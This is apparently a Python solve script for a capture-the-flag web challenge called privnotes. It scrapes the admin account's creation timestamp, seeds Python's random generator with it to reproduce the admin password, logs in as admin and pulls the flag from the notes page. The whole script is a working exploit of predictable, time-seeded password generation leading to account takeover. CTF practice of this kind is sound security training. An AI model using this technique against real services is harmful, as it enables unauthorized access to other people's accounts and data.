import requests
import string
import random
import bs4
import re

url = "http://privnotes.challs.olicyber.it"
login = "/login"
register = "/register"
users = "/users"
notes = "/notes"

def get_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

s = requests.Session()

data = {
    "username": get_random_string(7)
}

r = s.post(url + register, data=data)
r = s.get(url + users)
soup = bs4.BeautifulSoup(r.text, "html.parser")
date = soup.find("time")
date = date.get("raw")
random.seed(float(date))
password = "".join(random.choices(string.ascii_letters + string.digits, k=16))
adminCredentials ={
    "username": "admin",
    "password": password
}
r = s.post(url + login, data=adminCredentials)
r = s.get(url+ notes)
flag = re.findall(r"flag\{[^}]*\}", r.text)
print(flag[0])
